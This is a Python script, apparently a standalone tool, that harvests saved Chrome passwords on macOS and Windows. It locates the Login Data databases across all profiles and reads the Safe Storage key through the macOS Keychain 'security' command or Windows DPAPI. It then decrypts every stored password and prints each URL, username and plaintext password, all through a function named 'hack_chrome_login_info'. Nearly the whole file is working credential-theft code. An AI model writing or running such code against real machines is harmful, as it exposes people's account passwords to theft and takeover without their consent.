from dataclasses import dataclass
import os
import glob
import sqlite3
import hashlib
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import platform
import json
import base64
import shutil


@dataclass
class LoginInfo:
    url: str
    username: str
    password: str


def get_login_data_paths() -> list:
    """
    Locate Chrome's Login Data database files across different profiles for macOS and Windows.
    Paths include for macOS:
    - ~/Library/Application Support/Google/Chrome/Profile*/Login Data
    - ~/Library/Application Support/Google/Chrome/Default/Login Data
    Paths include for Windows:
    - C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile*\\Login Data
    - C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data
    Returns:
        A list of paths to Login Data database files.
    """

    paths = []
    if platform.system() == "Darwin":  # macOS
        # Define common search path for macOS
        profile_paths = os.path.expanduser(
            "~/Library/Application Support/Google/Chrome/Profile*/Login Data"
        )
        default_path = os.path.expanduser(
            "~/Library/Application Support/Google/Chrome/Default/Login Data"
        )

        # First, try finding profiles
        paths = glob.glob(profile_paths)
        if not paths:
            # Fallback to the Default profile
            if os.path.exists(default_path):
                paths = [default_path]
    elif platform.system() == "Windows":  # Windows
        user_profile = os.environ.get("USERPROFILE", "")
        if user_profile:
            # Define common search path for Windows
            profile_paths = os.path.join(
                user_profile,
                "AppData\\Local\\Google\\Chrome\\User Data\\Profile*\\Login Data",
            )
            default_path = os.path.join(
                user_profile,
                "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
            )

            # First, try finding profiles
            paths = glob.glob(profile_paths)
            if not paths:
                # Fallback to the Default profile
                if os.path.exists(default_path):
                    paths = [default_path]
    else:
        raise ("ERROR: Unsupported operating system.")
    if not paths:
        raise ("ERROR: No Login Data files found.")
    return paths


def fetch_safe_storage_key(service_name: str = "Chrome") -> str:
    """
    Retrieve the Chrome Safe Storage Key from the macOS Keychain or Windows DPAPI.
    Args:
        service_name (str): The service name in Keychain (e.g., 'Chrome').
    Returns:
        The Safe Storage Key as a string.
    """
    safe_storage_key = ""
    if platform.system() == "Darwin":  # macOS
        try:
            # Use macOS 'security' CLI to fetch the password
            cmd = f"security find-generic-password -ga '{service_name}' 2>&1 | awk '/password:/ {{print $2}}'"
            raw_output = subprocess.check_output(cmd, shell=True, text=True).strip()
            safe_storage_key = raw_output.replace('"', "")  # Remove surrounding quotes
        except subprocess.CalledProcessError:
            raise (
                f"ERROR: Failed to retrieve {service_name} Safe Storage Key from Keychain."
            )
    elif platform.system() == "Windows":  # Windows
        import win32crypt

        try:
            # Get secret key from Chrome Local State file
            local_state_path = os.path.join(
                os.environ["LOCALAPPDATA"],
                "Google",
                "Chrome",
                "User Data",
                "Local State",
            )
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # Remove 'DPAPI' prefix
            secret_key = secret_key[5:]
            safe_storage_key = win32crypt.CryptUnprotectData(
                secret_key, None, None, None, 0
            )[1]
        except Exception as e:
            raise (f"[ERR] {str(e)}: Chrome secret key cannot be found")

    if not safe_storage_key:
        raise ("ERROR: Safe Storage Key retrieval failed.")
    return safe_storage_key


def chrome_decrypt(encrypted_value: bytes, key_16: bytes) -> str:
    """
    Decrypt an encrypted password using AES-128-CBC (macOS) or AES-128-GCM (Windows).
    Args:
        encrypted_value (bytes): The encrypted value from Chrome's database.
        key_16 (bytes): The 16-byte key derived from PBKDF2.
    Returns:
        The decrypted password as a string.
    """

    try:
        if (
            platform.system() == "Darwin"
        ):  # macOS (AES-128-CBC with a fixed IV of 16 bytes)
            # Remove the 'v10' prefix
            enc_pass = encrypted_value[3:]
            # Chrome uses a fixed IV of 16 bytes filled with 0x20 (space)
            iv = b"\x20" * 16
            # Perform AES decryption
            cipher = AES.new(key_16, AES.MODE_CBC, iv)
            decrypted = unpad(cipher.decrypt(enc_pass), AES.block_size)
            return decrypted.decode("utf-8", errors="replace")
        elif platform.system() == "Windows":  # Assume Windows (AES-128-GCM)
            initialisation_vector = encrypted_value[3:15]
            encrypted_password = encrypted_value[15:-16]
            cipher = AES.new(key_16, AES.MODE_GCM, initialisation_vector)
            return cipher.decrypt(encrypted_password).decode()
    except Exception as e:
        return f"[Decryption Error: {str(e)}]"


def process_login_data(login_data_path: str, safe_storage_key: str) -> list[LoginInfo]:
    """
    Process a single Login Data database to decrypt stored credentials.
    Args:
        login_data_path (str): Path to the Login Data database.
        safe_storage_key (str): Chrome Safe Storage Key from macOS Keychain.
    Returns:
        A list of tuples (url, username, decrypted_password).
    """
    if platform.system() == "Darwin":
        # Derive the 16-byte key using PBKDF2
        key_16 = hashlib.pbkdf2_hmac(
            "sha1", safe_storage_key.encode("utf-8"), b"saltysalt", 1003
        )[:16]
    elif platform.system() == "Windows":
        key_16 = safe_storage_key
    else:
        raise ("ERROR: Unsupported operating system.")

    decrypted_list = []
    # Create a temporary copy of the database to avoid file lock issues
    temp_login_data_path = f"{login_data_path}.temp"
    shutil.copy2(login_data_path, temp_login_data_path)

    try:
        # Connect to the copied database
        conn = sqlite3.connect(temp_login_data_path)
        cursor = conn.cursor()

        # Query for stored credentials
        cursor.execute("SELECT username_value, password_value, origin_url FROM logins")
        for username, encrypted_password, url in cursor.fetchall():
            if not username or not encrypted_password:
                continue
            if not encrypted_password.startswith(b"v10"):
                continue  # Skip non-AES-CBC entries

            # Decrypt the password
            decrypted_password = chrome_decrypt(encrypted_password, key_16)
            decrypted_list.append(LoginInfo(url or "[No URL]", username, decrypted_password))
            # decrypted_list.append((url or "[No URL]", username, decrypted_password))

        cursor.close()
        conn.close()
    except Exception as e:
        print(f"ERROR processing {login_data_path}: {e}")
    finally:
        # Clean up the temporary file
        if os.path.exists(temp_login_data_path):
            os.remove(temp_login_data_path)

    return decrypted_list

def beauty_print(login_list: list[LoginInfo]) -> None:
    """
    美观地打印包含 LoginInfo 的列表。

    :param login_list: 包含 LoginInfo 对象的列表
    """
    if not login_list:
        print("No login information available.")
        return
    
    print("=" * 50)
    print("Login Credentials")
    print("=" * 50)

    for i, info in enumerate(login_list, start=1):
        print(f"[{i}]")
        print(f"  URL:      {info.url}")
        print(f"  Username: {info.username}")
        print(f"  Password: {info.password}")
        print("-" * 50)

    print("End of List")
    print("=" * 50)

def hack_chrome_login_info()->list[LoginInfo]:
    login_data_paths = get_login_data_paths()
    safe_storage_key = fetch_safe_storage_key("Chrome")
    
    credentials :list[LoginInfo]= []
    for login_data_path in login_data_paths:
        decrypted_credentials = process_login_data(
                    login_data_path, safe_storage_key
                )
        credentials.extend(decrypted_credentials)
    return credentials

if __name__ == "__main__":
    infos = hack_chrome_login_info()
    beauty_print(infos)
